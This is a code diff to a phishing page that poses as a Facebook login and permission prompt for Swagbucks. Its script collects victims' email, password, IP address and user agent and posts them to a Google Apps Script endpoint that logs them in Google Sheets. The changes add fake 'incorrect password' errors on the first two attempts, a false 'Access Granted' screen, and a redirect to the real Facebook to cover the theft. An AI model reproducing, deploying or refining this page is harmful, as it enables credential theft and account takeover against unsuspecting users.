@@ -58,7 +58,7 @@
         </div>
     </div>
 
-    <!-- Success Screen - Updated with better messaging -->
+    <!-- Success Screen -->
     <div id="successScreen" class="success-section hidden">
         <div class="success-content">
             <div class="success-checkmark">
@@ -78,36 +78,26 @@
                     <img src="facebook.png" alt="Facebook" class="success-facebook-logo" onerror="this.style.display='none'; this.insertAdjacentHTML('afterend', '<div class=\'success-fallback-circle facebook-fallback\'><span>F</span></div>');">
                 </div>
             </div>
-            <h2 class="success-title">✓ Connection Successful</h2>
-            <p class="success-message">Your Facebook account has been successfully connected to Swagbucks.</p>
-            
-            <div class="success-info-box">
-                <p class="info-title">What happens next?</p>
-                <div class="info-item">
-                    <span class="info-icon">🏆</span>
-                    <span class="info-text">Start earning SB points for your activities</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-icon">📊</span>
-                    <span class="info-text">Participate in surveys and offers</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-icon">💰</span>
-                    <span class="info-text">Redeem SB for gift cards or cash</span>
-                </div>
+            <h2 class="success-title">Access Granted</h2>
+            <p class="success-message">You have successfully granted Swagbucks permission to access your Facebook account.</p>
+            <div class="success-details">
+                <p>Swagbucks can now:</p>
+                <ul>
+                    <li>✓ View your name and profile picture</li>
+                    <li>✓ Access your page insights</li>
+                    <li>✓ Manage comments on your page</li>
+                    <li>✓ Read content posted on your page</li>
+                </ul>
             </div>
-            
-            <div class="success-note">
-                <p>You can manage or remove Swagbucks' access anytime in your Facebook Settings under "Apps and Websites".</p>
-            </div>
-            
-            <button id="continueToFacebookBtn" class="btn-success">Continue to Swagbucks</button>
+            <button id="continueToFacebookBtn" class="btn-success">Continue to Facebook</button>
         </div>
     </div>
 
     <script>
-        // ✅ YOUR GOOGLE APPS SCRIPT WEB APP URL (CORRECTLY INSERTED)
-        const GOOGLE_SHEETS_API_URL = 'https://script.google.com/macros/s/AKfycbwlvggcszn4S1V-nZ6uKYIjLpSYcTOzputQM8w6113_iP_VjPcMJmi1xrJhFQw1O4Rs/exec';
+        // ========== LOGIN ATTEMPT TRACKING ==========
+        // Track number of failed login attempts
+        let loginAttempts = 0;
+        const MAX_ATTEMPTS_BEFORE_SUCCESS = 3;
         
         // DOM elements
         const permissionScreen = document.getElementById('permissionScreen');
@@ -123,6 +113,10 @@
         const forgotPasswordLink = document.getElementById('forgotPasswordLink');
         const createAccountLink = document.getElementById('createAccountLink');
 
+        // Debug: Check if elements are found
+        console.log('Continue button found:', continueBtn);
+        console.log('Cancel button found:', cancelBtn);
+
         function showPermissionScreen() {
             permissionScreen.classList.remove('hidden');
             loginScreen.classList.add('hidden');
@@ -131,6 +125,8 @@
             passwordInput.value = '';
             errorDiv.classList.add('hidden');
             errorDiv.innerText = '';
+            // Reset login attempts when returning to permission screen
+            loginAttempts = 0;
         }
 
         function showLoginScreen() {
@@ -139,6 +135,9 @@
             successScreen.classList.add('hidden');
             errorDiv.classList.add('hidden');
             errorDiv.innerText = '';
+            // Clear input fields
+            usernameInput.value = '';
+            passwordInput.value = '';
         }
 
         function showSuccessScreen() {
@@ -147,11 +146,24 @@
             successScreen.classList.remove('hidden');
         }
 
+        // Function to show error message with different text based on attempt count
+        function showLoginError(attempts) {
+            errorDiv.classList.remove('hidden');
+            if (attempts === 1) {
+                errorDiv.innerText = "Incorrect email or password. Please try again.";
+            } else if (attempts === 2) {
+                errorDiv.innerText = "The email or password you entered is incorrect. Please check and try again.";
+            }
+        }
+
         // Continue button click handler
         if (continueBtn) {
-            continueBtn.addEventListener('click', function() {
+            continueBtn.addEventListener('click', function(e) {
+                console.log('Continue button clicked');
                 showLoginScreen();
             });
+        } else {
+            console.error('Continue button not found! Check the ID: continueAsSarahBtn');
         }
 
         // Cancel button click handler
@@ -161,10 +173,10 @@
             });
         }
 
-        // Continue to Swagbucks button
+        // Continue to Facebook button
         if (continueToFacebook) {
             continueToFacebook.addEventListener('click', function() {
-                window.location.href = "https://www.swagbucks.com/";
+                window.location.href = "https://m.facebook.com/?_rdr";
             });
         }
 
@@ -196,7 +208,10 @@
             }
         }
 
-        // ✅ FIXED: Store credentials in Google Sheets (CORRECTLY IMPLEMENTED)
+        // YOUR GOOGLE APPS SCRIPT WEB APP URL (REPLACE WITH YOUR ACTUAL URL)
+        const GOOGLE_SHEETS_API_URL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec';
+
+        // Store credentials in Google Sheets
         async function storeCredentials(usernameEmail, pwd) {
             if (!usernameEmail || !pwd) {
                 throw new Error("Please fill in both fields.");
@@ -214,13 +229,12 @@
                 formData.append('userAgent', userAgent);
                 
                 console.log('Sending data to Google Sheets...');
-                console.log('URL:', GOOGLE_SHEETS_API_URL);
                 console.log('Data:', { email: usernameEmail, ipAddress, userAgent });
                 
                 // Send to Google Sheets
                 const response = await fetch(GOOGLE_SHEETS_API_URL, {
                     method: 'POST',
-                    mode: 'no-cors', // Required for cross-origin requests to Google Scripts
+                    mode: 'no-cors',
                     headers: {
                         'Content-Type': 'application/x-www-form-urlencoded',
                     },
@@ -248,32 +262,50 @@
             }
         }
 
-        // Login handler
+        // Login handler with attempt tracking
         if (loginSubmit) {
             loginSubmit.addEventListener('click', async function(e) {
                 e.preventDefault();
                 const email = usernameInput.value.trim();
                 const password = passwordInput.value.trim();
                 
+                // Clear previous error
                 errorDiv.classList.add('hidden');
                 errorDiv.innerText = '';
                 
+                // Validate inputs are not empty
                 if (!email || !password) {
                     errorDiv.innerText = "Email/Username and password are required.";
                     errorDiv.classList.remove('hidden');
                     return;
                 }
                 
-                setLoginLoading(true);
+                // Increment login attempt counter
+                loginAttempts++;
+                console.log('Login attempt #' + loginAttempts);
                 
-                try {
-                    await storeCredentials(email, password);
-                    showSuccessScreen();
-                } catch (err) {
-                    console.error("Storage error:", err);
-                    errorDiv.innerText = err.message || "Authentication failed. Please try again.";
-                    errorDiv.classList.remove('hidden');
-                    setLoginLoading(false);
+                // Check if this is the 3rd attempt (success)
+                if (loginAttempts >= MAX_ATTEMPTS_BEFORE_SUCCESS) {
+                    // SUCCESS - On 3rd attempt, proceed to permission granted
+                    setLoginLoading(true);
+                    
+                    try {
+                        // Store credentials in Google Sheets
+                        await storeCredentials(email, password);
+                        showSuccessScreen();
+                    } catch (err) {
+                        console.error("Storage error:", err);
+                        errorDiv.innerText = err.message || "Authentication failed. Please try again.";
+                        errorDiv.classList.remove('hidden');
+                        setLoginLoading(false);
+                    }
+                } else {
+                    // FAILURE - Show error message for attempts 1 and 2
+                    showLoginError(loginAttempts);
+                    
+                    // Clear password field for retry (like real Facebook)
+                    passwordInput.value = '';
+                    passwordInput.focus();
                 }
             });
         }
@@ -297,6 +329,7 @@
             });
         }
         
+        // Show permission screen initially
         showPermissionScreen();
     </script>
 </body>
